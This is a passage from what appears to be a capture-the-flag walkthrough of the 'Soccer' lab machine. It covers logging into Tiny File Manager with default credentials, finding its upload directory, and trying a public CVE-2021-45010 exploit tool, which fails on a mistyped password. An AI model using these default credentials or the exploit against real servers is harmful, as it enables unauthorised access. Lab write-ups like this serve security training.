# Tiny File Manager Exploitation

## Default Credentials

Since this is a commonly deployed application, checking for default credentials is worthwhile.

Working credentials:

```text
admin : admin@123
```

After authentication we gain access to:

```text
http://soccer.htb/tiny/tinyfilemanager.php?p=
```

---

## Upload Functionality

An upload directory is available:

```text
http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads
```

The application allows file uploads if the target directory has proper write permissions.

While an exploit exists for CVE-2021-45010:

```text
https://github.com/BKreisel/CVE-2021-45010
```

I initially attempted to use it.

```bash
cve-2021-45010 \
-u http://soccer.htb/tiny/ \
-l admin \
-p admin@1234 \
-g tiny/uploads \
-r uploads
```

Output:

```text
[-] Error: Login Failed.
```

Since the automated exploit was unsuccessful, I switched to a manual approach.

